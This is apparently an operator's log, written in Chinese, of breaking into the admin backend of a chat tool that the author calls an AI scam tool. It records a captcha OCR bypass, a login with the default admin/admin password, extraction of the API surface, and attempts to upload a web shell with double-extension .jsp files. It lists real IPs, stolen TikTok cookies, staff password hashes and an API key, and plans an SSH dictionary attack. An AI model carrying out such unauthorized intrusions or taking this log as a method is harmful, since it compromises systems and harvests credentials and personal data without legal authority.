# 悟空聊天 Web 管理后台突破案例(2026-08)

隐藏管理后台的发现 → 验证码破解 → admin 登录 → 366 API 全暴露。目标: tk_wu.sswhgame.com 作者(悟空聊天/大圣采集, AI 引流诈骗工具)。

## 1. 发现链(关键: 客户端注释里的域名)

```
客户端源码 electron/api/ChatAPI.ts 注释行:
  //let backaddress = "http://tk_wu.sswhgame.com/api";

nslookup tk_wu.sswhgame.com 8.8.8.8 → 43.130.37.129 (全新 IP!)
直连 http://43.130.37.129/ → 200 HTML <title>智能聊天</title> (Vue SPA 后台)
```

**教训**: 客户端源码里的注释/配置域名 = 未暴露资产。端口扫描/Shodan 都没扫过这台(只扫了业务 IP 列表),真实域名 DNS 解析才是钥匙。

## 2. 后台指纹

- `<title>智能聊天</title>` + layui 风格(loader 背景 #5fb878 = layui 主色)
- 单页 `/assets/index-14796f32.js`(984KB 主 bundle)+ 111 个懒加载 chunk
- nginx/1.25.3 反代(80 端口);API 走同域 `/api/` 前缀(nginx 转发到后端)
- **nginx SPA 回退**: 任意路径都返回 index.html(200 HTML)→ 路径存在性探测必须区分「HTML vs 文件内容」

## 3. 验证码自动登录(ddddocr 全流程)

```
1. GET /api/user/captcha → {"data":{"key":"<uuid>","img":"data:image/png;base64,..."}}
2. ddddocr 识别 img → "2325" (4 位数字, 首次识别即中)
3. POST /api/user/slogin  {"account":"admin","password":"admin","vercode":"2325","captchaKey":"<key>"}
   → {"code":200,"data":{"token":"eyJ..."}}
```

要点:
- 验证码绕过测试(空/固定/复用 key)全失败 → 真校验,直接 OCR
- 登录参数名从 bundle 提取:`loginForm = reactive({account, password, vercode, captchaKey})`
- ddddocr: `pip install ddddocr`;`ocr.classification(img_bytes)`;len != 4 时重试(验证码有重试循环,10 次内必中)

## 4. 后台 API 面(366 个, 从 bundle 提取)

```
提取方法: 主 bundle 正则 /\.\/([a-z0-9_]+-[a-f0-9]+\.js)/ 拿 chunk 列表 → 批量下载 → 正则提取 '"/api/...' 路径

高价值分类:
- 上传: /account/uploadFile, /avatar/uploadFile, /playData/uploadFile, /playAweme/uploadFile, /pm/static/ip/uploadFile
- 系统管理: /api/system/user/page, /api/system/menu/page, /api/system/login-record/page, /api/file/page
- 员工: /staff/list, /staff/staffList
- 账号: /account/accountList(169 个 TikTok 账号 cookie 全量)
- 设备: /edevicelist/*, /edeviceaccount/*
- 任务: /task/*, /cloud/task/*, /comment/*/task/*, /pm/letter/task/*(私信/评论/关注/视频全自动化)
- 导出: /extract/group/downloadExcel?, /downloadWebTxt?, /accountGroup/downFileInfo?
- 其他: /link/node/redisList(Redis 信息), /dynamicIp/*(动态 IP)
```

## 5. 上传接口探测(account/uploadFile)

```
POST /api/account/uploadFile (multipart, 字段名 file[])
- 参数名确认: 报 "Required request part 'file[]'" → 字段是 file[]
- 正常 txt/json → 500 内部错误(进入处理但后续失败)
- jsp 单扩展名/大写/jspx/jspf/war/分号/空字节 → 400 上传失败(黑名单)
- 双重扩展名 .txt.jsp / .json.jsp / .txt.JSP → 500 = 通过黑名单!
- 存储路径: /api/upload/<filename> → 200 空(Spring 接管, 但文件内容空 = 未落盘或 500 中断)
- 结论: 该上传接口后端是坏的(全 500), 不是可利用点 — 立即换面
```

**上传探测套路**: 先字段名(错误消息) → 黑名单行为(400 vs 500) → 双重扩展名绕过信号(500) → 存储路径探测(/api/upload/ 前缀 Spring 接管) → 访问验证(区分 HTML/内容)。

## 6. 当前状态(2026-08-09)

- ✅ 管理后台 admin/admin 登录成功(token 保存于 D:\渗透\wukong\admin_web_token.txt)
- ✅ staff/list + accountList 全数据可见
- ✅ 366 API 面提取
- ❌ 上传 getshell 未成功(接口 500 后端坏)
- ❌ 服务器 shell 未拿到(管理入口 80/443/8888/3000 全挂死 = 被攻击后加固态)
- ⏳ 下一步: /api/system/user/page(可能更高权限账号)、/api/file/page(文件列表)、/link/node/redisList(Redis 泄露)、其他 4 个上传接口、SSH 20182 rockyou 撞库

## 7. 凭证与资产(会话内确认)

- 后台: admin/admin(JWT, 43.130.37.129)
- API: admin/admin(170.106.169.59:81, 同后端)
- DeepSeek API key: agent 15 extApiKey(有效, 余额 9.37 元)
- 169 个 TikTok 账号 cookie(author_accounts.jsonl)
- 78 员工 + 密码哈希(staff_list.json)
- 签名服务器 Swagger x2(19999: 43.136.113.196 / 159.75.90.168)
